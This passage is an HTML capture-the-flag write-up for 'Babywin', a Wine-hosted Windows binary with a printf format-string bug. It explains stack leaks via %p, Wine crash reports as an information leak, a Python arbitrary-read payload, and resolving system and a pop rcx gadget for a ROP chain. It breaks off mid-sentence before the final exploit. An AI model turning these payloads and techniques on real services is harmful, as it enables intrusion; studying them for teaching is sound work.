@@ -1,0 +1,1207 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Babywin - Detailed Write-up</title>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500&family=Inter:wght@300;400;500;600;700&display=swap"
+        rel="stylesheet">
+    <style>
+        :root {
+            --bg-primary: #0b0f19;
+            --bg-secondary: #161b26;
+            --bg-tertiary: #1f2633;
+            --accent: #38bdf8;
+            --accent-hover: #7dd3fc;
+            --text-main: #f1f5f9;
+            --text-muted: #94a3b8;
+            --border: #2e3748;
+            --code-bg: #0e131f;
+            --alert-border: #38bdf8;
+            --alert-bg: rgba(56, 189, 248, 0.08);
+            --success: #10b981;
+            --warning: #f59e0b;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, sans-serif;
+            background-color: var(--bg-primary);
+            color: var(--text-main);
+            line-height: 1.7;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        header {
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 20px;
+            margin-bottom: 40px;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            font-weight: 700;
+            color: #ffffff;
+            margin: 0 0 10px 0;
+            background: linear-gradient(to right, #38bdf8, #818cf8);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .meta-info {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+
+        h2 {
+            font-size: 1.8rem;
+            color: #ffffff;
+            border-left: 4px solid var(--accent);
+            padding-left: 15px;
+            margin-top: 50px;
+            margin-bottom: 20px;
+        }
+
+        h3 {
+            font-size: 1.35rem;
+            color: var(--accent);
+            margin-top: 30px;
+            margin-bottom: 15px;
+        }
+
+        h4 {
+            font-size: 1.1rem;
+            color: #cbd5e1;
+            margin-top: 25px;
+            margin-bottom: 10px;
+        }
+
+        p {
+            margin-bottom: 20px;
+        }
+
+        a {
+            color: var(--accent);
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        a:hover {
+            color: var(--accent-hover);
+            text-decoration: underline;
+        }
+
+        /* Callout Box */
+        .callout {
+            background-color: var(--alert-bg);
+            border-left: 4px solid var(--alert-border);
+            padding: 16px 20px;
+            margin: 25px 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .callout-title {
+            font-weight: 600;
+            color: var(--accent);
+            margin-bottom: 6px;
+        }
+
+        /* Tables */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 25px 0;
+            background-color: var(--bg-secondary);
+            border-radius: 8px;
+            overflow: hidden;
+            border: 1px solid var(--border);
+        }
+
+        th,
+        td {
+            padding: 12px 16px;
+            border: 1px solid var(--border);
+            text-align: left;
+            font-size: 0.95rem;
+        }
+
+        th {
+            background-color: var(--bg-tertiary);
+            color: #ffffff;
+            font-weight: 600;
+        }
+
+        tr:nth-child(even) {
+            background-color: rgba(255, 255, 255, 0.02);
+        }
+
+        /* Code Blocks */
+        pre {
+            background-color: var(--code-bg);
+            border: 1px solid var(--border);
+            padding: 18px;
+            border-radius: 8px;
+            overflow-x: auto;
+            margin: 20px 0;
+        }
+
+        code {
+            font-family: 'Fira Code', 'Courier New', Courier, monospace;
+            font-size: 0.9rem;
+            color: #38bdf8;
+            background-color: rgba(56, 189, 248, 0.08);
+            padding: 2px 6px;
+            border-radius: 4px;
+        }
+
+        pre code {
+            color: #e2e8f0;
+            background-color: transparent;
+            padding: 0;
+            border-radius: 0;
+            font-size: 0.88rem;
+        }
+
+        ul,
+        ol {
+            margin-bottom: 25px;
+            padding-left: 25px;
+        }
+
+        li {
+            margin-bottom: 8px;
+        }
+
+        .divider {
+            height: 1px;
+            background-color: var(--border);
+            margin: 40px 0;
+        }
+
+        /* Custom styling for lists in summary table */
+        .table-compact td {
+            padding: 8px 12px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <header>
+            <h1>Babywin - Detailed Write-up</h1>
+            <div class="meta-info">Category: Pwn / Win64 Exploitation Under Wine</div>
+        </header>
+
+        <!-- TABLE OF CONTENTS -->
+        <section id="table-of-contents">
+            <h2>Table of Contents</h2>
+            <ol>
+                <li><a href="#table-of-contents">Table of Contents</a></li>
+                <li><a href="#beginner-background">Beginner Background</a></li>
+                <li><a href="#challenge-summary">Challenge Summary</a></li>
+                <li><a href="#technical-glossary">Technical Glossary</a></li>
+                <li><a href="#visual-overview">Visual Overview</a></li>
+                <li><a href="#provided-artifacts">Provided Artifacts</a></li>
+                <li><a href="#program-behavior">Program Behavior</a></li>
+                <li><a href="#finding-the-vulnerability">Finding the Vulnerability From the Service</a></li>
+                <li><a href="#wine-crash-reports">Wine Crash Reports as an Information Leak</a></li>
+                <li><a href="#format-argument-mapping">Format Argument Mapping</a></li>
+                <li><a href="#arbitrary-read">Arbitrary Read</a></li>
+                <li><a href="#locating-system">Locating <code>system</code></a></li>
+                <li><a href="#finding-gadgets">Finding a <code>pop rcx; ret</code> Gadget</a></li>
+                <li><a href="#failed-approach">Failed Approach: IAT Overwrite</a></li>
+                <li><a href="#selecting-stack-target">Selecting the Stack Target</a></li>
+                <li><a href="#intended-rop-chain">Intended ROP Chain</a></li>
+                <li><a href="#wine-hn-quirk">The Important Wine <code>%hn</code> Quirk</a></li>
+                <li><a href="#controlling-printed-count">Controlling the Printed Count</a></li>
+                <li><a href="#placing-write-addresses">Placing Write Addresses</a></li>
+                <li><a href="#building-payload">Building and Understanding the Final Payload</a></li>
+                <li><a href="#final-exploit">Final Exploit</a></li>
+                <li><a href="#running-exploit">Running the Exploit</a></li>
+                <li><a href="#manual-discovery">Manual Discovery Checklist</a></li>
+                <li><a href="#exploitation-flow">Exploitation Flow</a></li>
+                <li><a href="#key-takeaways">Key Takeaways</a></li>
+            </ol>
+        </section>
+
+        <div class="divider"></div>
+
+        <!-- BEGINNER BACKGROUND SECTION -->
+        <section id="beginner-background">
+            <h2>Beginner Background</h2>
+            <p>This section explains the basic ideas used later in the exploit. Readers who already know format strings,
+                pointers, calling conventions, and ROP can skip to the subsequent sections.</p>
+
+            <h3>Format Strings</h3>
+            <p><code>printf</code> normally receives a fixed format string followed by matching arguments:</p>
+            <pre><code>printf("number = %d\n", 123);</code></pre>
+            <p>The format string tells <code>printf</code> what to do:</p>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Specifier</th>
+                        <th>Action</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><code>%d</code></td>
+                        <td>Fetch and print an integer.</td>
+                    </tr>
+                    <tr>
+                        <td><code>%p</code></td>
+                        <td>Fetch and print a pointer (hexadecimal value).</td>
+                    </tr>
+                    <tr>
+                        <td><code>%s</code></td>
+                        <td>Fetch a pointer and print the string located at that address.</td>
+                    </tr>
+                    <tr>
+                        <td><code>%c</code></td>
+                        <td>Fetch and print a single character.</td>
+                    </tr>
+                    <tr>
+                        <td><code>%n</code></td>
+                        <td>Fetch a pointer and write the printed-character count there (4 bytes).</td>
+                    </tr>
+                    <tr>
+                        <td><code>%hn</code></td>
+                        <td>Like <code>%n</code>, but writes only a 2-byte halfword.</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <p>User input should always be printed safely like this:</p>
+            <pre><code>printf("%s", user_input);</code></pre>
+            <p>However, Babywin does the following:</p>
+            <pre><code>printf(user_input);</code></pre>
+
+            <div class="callout">
+                <div class="callout-title">The Vulnerability Explained</div>
+                <p>Instead of safely printing our text, the program lets our text become instructions for
+                    <code>printf</code>. Sending <code>%p</code> does not print the literal characters "%p". It tells
+                    <code>printf</code> to fetch a value from the registers and stack that the program never
+                    intentionally supplied. This gives the attacker three important capabilities (primitives):
+                </p>
+                <ol>
+                    <li><code>%p</code> leaks values from registers and the stack.</li>
+                    <li><code>%s</code> reads arbitrary memory through a leaked/supplied pointer.</li>
+                    <li><code>%n</code>/<code>%hn</code> writes to memory through a leaked/supplied pointer.</li>
+                </ol>
+            </div>
+
+            <h3>Pointers and Little Endian</h3>
+            <p>A pointer is a number containing a memory address. For example, <code>0x140004050</code> points to the
+                prompt string <code>"&gt; "</code> in this program.</p>
+            <p>x86-64 stores multi-byte integers in little-endian order (least significant byte first). The pointer is
+                packed into a payload in Python using:</p>
+            <pre><code>struct.pack("&lt;Q", 0x140004050)</code></pre>
+            <p>Here, <code>&lt;</code> specifies little endian, and <code>Q</code> represents an unsigned 64-bit integer
+                (qword).</p>
+
+            <h3>The Stack and <code>ret</code></h3>
+            <p>The stack is a memory area used for local variables, saved registers, and return addresses. The
+                <code>RSP</code> register points to its current top. On x86-64, a <code>ret</code> instruction behaves
+                approximately like:
+            </p>
+            <pre><code>RIP = *(uint64_t *)RSP;
+            RSP += 8;</code></pre>
+            <p><code>RIP</code> is the instruction pointer. If an attacker overwrites the return address at
+                <code>RSP</code>, they control where execution continues when the function returns.
+            </p>
+
+            <h3>ROP and Windows x64 Arguments</h3>
+            <p>Return-oriented programming (ROP) uses short instruction sequences already present in loaded executable
+                code (gadgets) that end with a <code>ret</code> instruction. The key gadget in this exploit is:</p>
+            <pre><code>pop rcx
+            ret</code></pre>
+            <p>The Windows x64 calling convention passes the first four function arguments in the following registers:
+            </p>
+            <pre><code>argument 1 -&gt; RCX
+            argument 2 -&gt; RDX
+            argument 3 -&gt; R8
+            argument 4 -&gt; R9</code></pre>
+            <p>The desired execution target is <code>system("cmd.exe /c type flag.txt")</code>. Thus, the exploit needs
+                to put the command string's address in <code>RCX</code> and then transfer execution to
+                <code>system</code>.
+            </p>
+        </section>
+
+        <div class="divider"></div>
+
+        <!-- CHALLENGE SUMMARY SECTION -->
+        <section id="challenge-summary">
+            <h2>Challenge Summary</h2>
+            <table>
+                <tbody>
+                    <tr>
+                        <th style="width: 20%;">Target</th>
+                        <td>A 64-bit Windows PE binary exposed over <code>nc 45.79.125.182 1339</code>.</td>
+                    </tr>
+                    <tr>
+                        <th>Environment</th>
+                        <td>The binary runs under Wine 8.0 on Linux.</td>
+                    </tr>
+                    <tr>
+                        <th>Bug</th>
+                        <td>Format string vulnerability via <code>printf(user_input);</code>.</td>
+                    </tr>
+                    <tr>
+                        <th>Goal</th>
+                        <td>Use the format string to replace a saved return address with a short ROP chain that calls
+                            <code>ucrtbase.dll!system("cmd.exe /c type flag.txt")</code>.
+                        </td>
+                    </tr>
+                    <tr>
+                        <th>Flag</th>
+                        <td><code>FLAG{b4by_w1n_g03s_brrrrrrrrr}</code></td>
+                    </tr>
+                    <tr>
+                        <th>Code</th>
+                        <td>The final exploit is available in <a href="./exploit.py"><code>exploit.py</code></a>.</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <div class="callout">
+                <div class="callout-title">Plain-English version</div>
+                <p>The binary trusts our input far too much. It is a bit like handing the office microphone to a
+                    stranger and then acting shocked when they start chairing the meeting.</p>
+            </div>
+        </section>
+
+        <div class="divider"></div>
+
+        <!-- TECHNICAL GLOSSARY -->
+        <section id="technical-glossary">
+            <h2>Technical Glossary</h2>
+            <p>Only the pwn-relevant terms are defined here, and each one is kept short so you can scan this section
+                quickly.</p>
+
+            <h3>Core Binary Exploitation Terms</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th style="width: 30%;">Term</th>
+                        <th>Meaning</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Information leak</strong></td>
+                        <td>A bug that reveals addresses, memory values, or process details that should have stayed
+                            hidden.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Arbitrary read</strong></td>
+                        <td>The ability to read data from an attacker-chosen address.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Arbitrary write</strong></td>
+                        <td>The ability to write a chosen value to an attacker-chosen address.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Payload</strong></td>
+                        <td>The complete input used to trigger and control the exploit.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Primitive</strong></td>
+                        <td>One small exploitation capability, such as a read or write, used to build the full exploit.
+                        </td>
+                    </tr>
+                    <tr>
+                        <td><strong>Control-flow hijack</strong></td>
+                        <td>Forcing execution to continue at an attacker-chosen address.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>ROP</strong></td>
+                        <td>A technique that chains existing code snippets ending in <code>ret</code> instead of
+                            injecting new shellcode.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Gadget</strong></td>
+                        <td>A short useful instruction sequence, such as <code>pop rcx; ret</code>.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>ROP chain</strong></td>
+                        <td>A sequence of gadget and function addresses placed on the stack so each <code>ret</code>
+                            continues the attack.</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Format-String Terms</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th style="width: 30%;">Term</th>
+                        <th>Meaning</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Format string bug</strong></td>
+                        <td>A vulnerability where user input is used as the <code>printf</code> format string itself.
+                        </td>
+                    </tr>
+                    <tr>
+                        <td><strong>Variadic function</strong></td>
+                        <td>A function like <code>printf</code> that accepts a variable number of arguments.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Format specifier</strong></td>
+                        <td>A percent sequence such as <code>%p</code>, <code>%s</code>, <code>%n</code>, or
+                            <code>%hn</code>.
+                        </td>
+                    </tr>
+                    <tr>
+                        <td><strong><code>%p</code></strong></td>
+                        <td>Prints a pointer value and is often used for leaks.</td>
+                    </tr>
+                    <tr>
+                        <td><strong><code>%s</code></strong></td>
+                        <td>Treats its argument as a pointer to a string and reads memory from that address.</td>
+                    </tr>
+                    <tr>
+                        <td><strong><code>%n</code></strong></td>
+                        <td>Writes the number of printed characters so far to an address.</td>
+                    </tr>
+                    <tr>
+                        <td><strong><code>%hn</code></strong></td>
+                        <td>Like <code>%n</code>, but intended to write only 2 bytes.</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Memory and CPU Terms</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th style="width: 30%;">Term</th>
+                        <th>Meaning</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Pointer</strong></td>
+                        <td>A value that contains a memory address.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Offset</strong></td>
+                        <td>A distance from a known base address.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Little endian</strong></td>
+                        <td>The x86-64 byte order where the least significant byte is stored first in memory.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>16-bit halfword</strong></td>
+                        <td>A 2-byte value.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>64-bit qword</strong></td>
+                        <td>An 8-byte value; most addresses in this challenge are qwords.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Register</strong></td>
+                        <td>A fast CPU storage slot such as <code>RIP</code>, <code>RSP</code>, or <code>RCX</code>.
+                        </td>
+                    </tr>
+                    <tr>
+                        <td><strong><code>RIP</code></strong></td>
+                        <td>The address of the instruction currently being executed.</td>
+                    </tr>
+                    <tr>
+                        <td><strong><code>RSP</code></strong></td>
+                        <td>The address of the current top of the stack.</td>
+                    </tr>
+                    <tr>
+                        <td><strong><code>RCX</code></strong></td>
+                        <td>The first argument register in the Windows x64 calling convention.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Stack</strong></td>
+                        <td>The memory area that stores local variables, saved state, and return addresses.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Stack frame</strong></td>
+                        <td>The part of the stack belonging to one active function call.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Saved return address</strong></td>
+                        <td>The address a function will jump to when it finishes and executes <code>ret</code>.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Calling convention</strong></td>
+                        <td>The rules that define where function arguments go and how control returns.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Stack alignment</strong></td>
+                        <td>A requirement that the stack pointer be aligned correctly before certain function calls.
+                        </td>
+                    </tr>
+                    <tr>
+                        <td><strong>Page fault</strong></td>
+                        <td>A crash caused by reading, writing, or executing an invalid or protected memory address.
+                        </td>
+                    </tr>
+                    <tr>
+                        <td><strong>ASLR</strong></td>
+                        <td>A defense that changes addresses between runs to make exploitation harder.</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Windows and Loader Terms</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th style="width: 30%;">Term</th>
+                        <th>Meaning</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>PE</strong></td>
+                        <td>The file format used by Windows executables and DLLs.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>DLL</strong></td>
+                        <td>A Windows shared library loaded into a process at runtime.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Module</strong></td>
+                        <td>A loaded executable or DLL.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Module base</strong></td>
+                        <td>The starting address where a module is mapped in memory.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>RVA</strong></td>
+                        <td>An offset measured from a module base, where
+                            <code>absolute address = module base + RVA</code>.
+                        </td>
+                    </tr>
+                    <tr>
+                        <td><strong>IAT</strong></td>
+                        <td>A table of resolved function pointers used when the program calls imported DLL functions.
+                        </td>
+                    </tr>
+                    <tr>
+                        <td><strong>Import</strong></td>
+                        <td>A function the executable expects another module to provide.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Export</strong></td>
+                        <td>A function a DLL makes available to other modules.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Export table</strong></td>
+                        <td>The PE metadata that maps exported names to RVAs.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Disassembly</strong></td>
+                        <td>Human-readable assembly output recovered from machine code.</td>
+                    </tr>
+                </tbody>
+            </table>
+        </section>
+
+        <!-- VISUAL OVERVIEW -->
+        <section id="visual-overview">
+            <h2>Visual Overview</h2>
+            <h3>Mind Map</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th style="width: 25%;">Stage</th>
+                        <th>Meaning</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Target</strong></td>
+                        <td>Windows PE binary running through Wine 8 as a remote TCP service.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Bug</strong></td>
+                        <td>User input is passed directly to <code>printf</code>, so <code>%p</code> leaks values,
+                            <code>%s</code> reads memory, and <code>%n</code> writes memory.
+                        </td>
+                    </tr>
+                    <tr>
+                        <td><strong>Recon</strong></td>
+                        <td>Map argument slots to buffer offsets, trigger Wine crash reports, and recover module bases,
+                            stack addresses, and the exact Wine build.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Address Resolution</strong></td>
+                        <td>Download the matching Wine 8 <code>ucrtbase.dll</code>, resolve <code>system</code>, find
+                            <code>pop rcx; ret</code>, and verify important remote bytes.
+                        </td>
+                    </tr>
+                    <tr>
+                        <td><strong>Failed Route</strong></td>
+                        <td>Try overwriting an IAT entry and learn that the IAT page is read-only.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Final Route</strong></td>
+                        <td>Target the saved return address on the stack, build a ROP chain, handle Wine's broken
+                            <code>%hn</code> behavior, and call <code>system("cmd.exe /c type flag.txt")</code>.
+                        </td>
+                    </tr>
+                    <tr>
+                        <td><strong>Result</strong></td>
+                        <td>Execute the command and print the flag.</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Exploitation Flowchart</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th style="width: 20%;">Phase</th>
+                        <th>Action</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Phase 1</strong></td>
+                        <td>Connect to the service, send <code>%p</code> probes, and confirm the input is used as a
+                            format string.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Phase 2</strong></td>
+                        <td>Map conversion numbers to buffer offsets, send invalid <code>%s</code>, read the Wine
+                            debugger report, and build a controlled <code>%s</code> memory read.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Phase 3</strong></td>
+                        <td>Download the matching Wine 8 <code>ucrtbase.dll</code>, resolve <code>system</code>, find
+                            <code>pop rcx; ret</code>, and verify important remote bytes.
+                        </td>
+                    </tr>
+                    <tr>
+                        <td><strong>Phase 4</strong></td>
+                        <td>Try IAT overwrite, discover the IAT is read-only, and switch to the saved return address on
+                            the stack.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Phase 5</strong></td>
+                        <td>Test <code>%hn</code> behavior, discover the 4-byte spill, write halfwords in increasing
+                            address order, build the stack ROP chain, load the command pointer into <code>RCX</code>,
+                            jump to <code>ucrtbase!system</code>, run <code>cmd.exe /c type flag.txt</code>, and extract
+                            the flag.</td>
+                    </tr>
+                </tbody>
+            </table>
+        </section>
+
+        <!-- PROVIDED ARTIFACTS -->
+        <section id="provided-artifacts">
+            <h2>Provided Artifacts</h2>
+            <p>We recovered this from remote:</p>
+            <pre><code>babywin_headers_0_600.bin
+babywin_idata_9000.bin
+babywin_pdata_6000.bin
+babywin_rdata_4000_4d28.bin
+babywin_text_1000_1900_v2.asm
+babywin_text_1000_1900_v2.bin
+data8000.bin
+iat.bin
+rdata4000.bin
+rdata5000.bin</code></pre>
+            <p>The most useful files were:</p>
+            <ol>
+                <li><code>babywin_text_1000_1900_v2.asm</code>: disassembly containing <code>main</code>.</li>
+                <li><code>babywin_idata_9000.bin</code>: live dump of the resolved import table.</li>
+                <li><code>babywin_rdata_4000_4d28.bin</code>: strings, including the <code>"&gt; "</code> prompt.</li>
+            </ol>
+        </section>
+
+        <!-- PROGRAM BEHAVIOR -->
+        <section id="program-behavior">
+            <h2>Program Behavior</h2>
+            <p>The relevant part of <code>main</code> starts at <code>main = 0x140001580</code>. The important
+                disassembly is:</p>
+            <pre><code>1400015f0: lea    -0x60(%rbp), %rax
+1400015f4: mov    %rdx, %r8
+1400015f7: mov    $0x1000, %edx
+1400015fc: mov    %rax, %rcx
+1400015ff: call   0x140002af0       ; fgets
+
+...
+
+140001621: lea    -0x60(%rbp), %rax
+140001625: mov    %rax, %rcx
+140001628: call   0x140002940       ; printf wrapper</code></pre>
+            <p>In simplified C, the program is:</p>
+            <pre><code>char buffer[0x1000];
+
+printf("&gt; ");
+
+while (fgets(buffer, sizeof(buffer), stdin)) {
+    buffer[strcspn(buffer, "\n")] = '\0';
+    printf(buffer);                 // Vulnerability
+    putchar('\r');
+    printf("&gt; ");
+}</code></pre>
+            <p>There is no menu and no heap-based interaction. Every submitted line is used directly as a format string.
+            </p>
+        </section>
+
+        <!-- FINDING THE VULNERABILITY -->
+        <section id="finding-the-vulnerability">
+            <h2>Finding the Vulnerability From the Service</h2>
+            <p>The first connection only displays a prompt: <code>&gt; </code>. A standard first test for a possible
+                format-string bug is sending:</p>
+            <pre><code>AAAA.%p.%p.%p.%p</code></pre>
+            <p>If the program used <code>printf("%s", input)</code>, the <code>%p</code> sequences would remain literal.
+                Babywin instead replaces them with hexadecimal values, proving that the input is interpreted as the
+                format string itself. The reconnaissance payload <code>%p %p %p %p %p %p</code> returned:</p>
+            <pre><code>0000000000000001
+000000000021ED20
+0000000000000001
+7025207025207025
+2520702520702520
+0000000000000070</code></pre>
+            <p>The fourth value is <code>0x7025207025207025</code>. Written as little-endian bytes, it translates to
+                <code>%p %p %p</code>. Those bytes came from the submitted input. This proves that format conversions
+                consume eight-byte chunks from the input buffer. Consequently, a pointer can be placed inside the input
+                and consumed by a later <code>%s</code> or <code>%n</code>.
+            </p>
+        </section>
+
+        <!-- WINE CRASH REPORTS -->
+        <section id="wine-crash-reports">
+            <h2>Wine Crash Reports as an Information Leak</h2>
+            <p>Invalid <code>%s</code> or <code>%n</code> operations crash inside Wine's UCRT implementation. Wine sends
+                its debugger report to the same socket as the program output. Sending <code>%s</code> produced a report
+                containing register values, stack contents, a backtrace, loaded module address ranges, and Wine version
+                information.</p>
+            <p>The important stable module bases were:</p>
+            <pre><code>babywin.exe = 0x0000000140000000
+kernelbase  = 0x000000007b000000
+kernel32    = 0x000000007b600000
+ntdll       = 0x0000000170000000
+ucrtbase    = 0x00000002c7470000</code></pre>
+            <p>The crash report also identified the environment as:</p>
+            <pre><code>Wine build: wine-8.0 (Debian 8.0~repack-4)
+Platform: x86_64
+Version: Windows 7</code></pre>
+            <p>Addresses were identical across new connections, so ASLR was effectively disabled for this service.</p>
+
+            <h3>Why an Invalid <code>%s</code> Leaks Information</h3>
+            <p><code>%s</code> treats its next argument as a pointer and reads bytes until it encounters a NUL byte.
+                Sending only <code>%s</code> made the first argument, <code>0x1</code>, act as the pointer. Reading
+                address <code>0x1</code> caused a page fault. Wine instead started its debugger and printed the report
+                to stdout, which was connected to the challenge socket, transforming a crash into a powerful leak.</p>
+
+            <h3>How to Read the Wine Debugger Report</h3>
+            <p>A typical Wine crash report contains several useful sections:</p>
+            <ul>
+                <li><strong>Register Dump:</strong> Snapshots of registers at the crash (e.g., <code>rip</code>,
+                    <code>rsp</code>, <code>rax</code>).
+                </li>
+                <li><strong>Stack Dump:</strong> Memory values around the current stack pointer <code>RSP</code>. This
+                    tells us if our writes reached their targets.</li>
+                <li><strong>Backtrace:</strong> Nested function calls leading to the crash (e.g.,
+                    <code>ucrtbase!pf_printf_a</code>).
+                </li>
+                <li><strong>Module List:</strong> Maps base addresses of loaded modules, crucial for converting RVAs to
+                    absolute remote addresses.</li>
+            </ul>
+        </section>
+
+        <!-- FORMAT ARGUMENT MAPPING -->
+        <section id="format-argument-mapping">
+            <h2>Format Argument Mapping</h2>
+            <p>Windows x64 passes the first four normal function arguments in registers (RCX, RDX, R8, R9). The
+                vulnerable function only explicitly supplies the format string in RCX. However, <code>printf</code>
+                continues reading variadic arguments from the register-save and stack areas.</p>
+            <p>Experimentally, the conversion-to-buffer mapping was:</p>
+            <pre><code>argument 1 = 0x1
+argument 2 = 0x21ed20
+argument 3 = 0x1
+argument 4 = buffer[0:8]
+argument 5 = buffer[8:16]
+argument 6 = buffer[16:24]
+...</code></pre>
+            <p>For conversion number <code>N</code>, where <code>N &gt;= 4</code>, the corresponding data begins at:</p>
+            <pre><code>buffer_offset = (N - 4) * 8</code></pre>
+            <p>Positional format specifiers such as <code>%16$s</code> were not supported by this UCRT build. All
+                arguments therefore had to be consumed sequentially.</p>
+
+            <h3>How the Mapping Was Found</h3>
+            <p>The mapping was measured using recognizable eight-byte markers in the payload:
+                <code>offset 0x00: AAAAAAAA</code>, <code>offset 0x08: BBBBBBBB</code>, etc., followed by many
+                <code>%p</code> conversions. By observing which conversion printed which marker, we confirmed the
+                mapping offset.
+            </p>
+        </section>
+
+        <!-- ARBITRARY READ -->
+        <section id="arbitrary-read">
+            <h2>Arbitrary Read</h2>
+            <p>To dereference an address with <code>%s</code>, the target address is placed at the buffer offset
+                consumed by that conversion. For example, to read the string at <code>0x140004050</code> using
+                conversion 16:</p>
+            <pre><code>import struct
+
+target = 0x140004050
+slot = 16
+
+fmt = b"%p" * (slot - 1) + b"%s"
+offset = (slot - 4) * 8
+payload = fmt.ljust(offset, b"Q")
+payload += struct.pack("&lt;Q", target)
+payload += b"\n"</code></pre>
+            <p>This successfully leaked the prompt string <code>"&gt; "</code>. The primitive was limited by stopping at
+                the first NUL byte, but it was enough to validate important addresses.</p>
+
+            <h3>Meaning of the Read Payload</h3>
+            <p>With <code>slot = 16</code>, the format string has 15 <code>%p</code> specifiers followed by one
+                <code>%s</code>. The 15 <code>%p</code> operations advance through the sequential variadic arguments,
+                and the 16th conversion (<code>%s</code>) consumes the pointer placed at buffer offset
+                <code>(16 - 4) * 8 = 96</code>.
+            </p>
+        </section>
+
+        <!-- LOCATING SYSTEM -->
+        <section id="locating-system">
+            <h2>Locating <code>system</code></h2>
+            <p>The service used the Debian package: <code>libwine 8.0~repack-4 amd64</code>. The matching package was
+                downloaded from Debian Snapshot and the DLL extracted:</p>
+            <pre><code>curl -L https://snapshot.debian.org/file/31bda63c3489917a52ef1c2a763c5cbf611573cd -o libwine_8.deb
+mkdir libwine_8 && cd libwine_8
+ar x ../libwine_8.deb
+bsdtar -xOf data.tar.xz ./usr/lib/x86_64-linux-gnu/wine/x86_64-windows/ucrtbase.dll &gt; ucrtbase.dll</code></pre>
+            <p>Using Python's <code>pefile</code>, the export RVA was resolved:</p>
+            <pre><code>import pefile
+pe = pefile.PE("ucrtbase.dll")
+for symbol in pe.DIRECTORY_ENTRY_EXPORT.symbols:
+    if symbol.name == b"system":
+        print(hex(symbol.address)) # system RVA = 0x524b0</code></pre>
+            <p>With the remote UCRT base, we calculated the absolute remote address of <code>system</code>:</p>
+            <pre><code>ucrtbase base = 0x2c7470000
+system RVA    =     0x524b0
+--------------------------------
+system        = 0x2c74c24b0</code></pre>
+            <p>The remote arbitrary-read primitive confirmed that this address contained valid function code beginning
+                with: <code>push rsi; push rbx; sub rsp, 0x28</code>.</p>
+        </section>
+
+        <!-- FINDING GADGETS -->
+        <section id="finding-gadgets">
+            <h2>Finding a <code>pop rcx; ret</code> Gadget</h2>
+            <p>Calling <code>system</code> requires loading the command string address into the <code>RCX</code>
+                register. Searching the matching <code>ucrtbase.dll</code> for <code>pop rcx; ret</code> found:</p>
+            <pre><code>pop rcx; ret = 0x2c74a8c32</code></pre>
+            <p>The bytes at that address were remotely verified as <code>59 c3</code>. Because the byte after
+                <code>pop rcx</code> (<code>59</code>) is <code>ret</code> (<code>c3</code>), a plain stack-alignment
+                gadget is available at <code>0x2c74a8c33</code>.
+            </p>
+        </section>
+
+        <!-- FAILED APPROACH -->
+        <section id="failed-approach">
+            <h2>Failed Approach: IAT Overwrite</h2>
+            <p>An initially attractive plan was to replace the imported function <code>strcspn</code> with
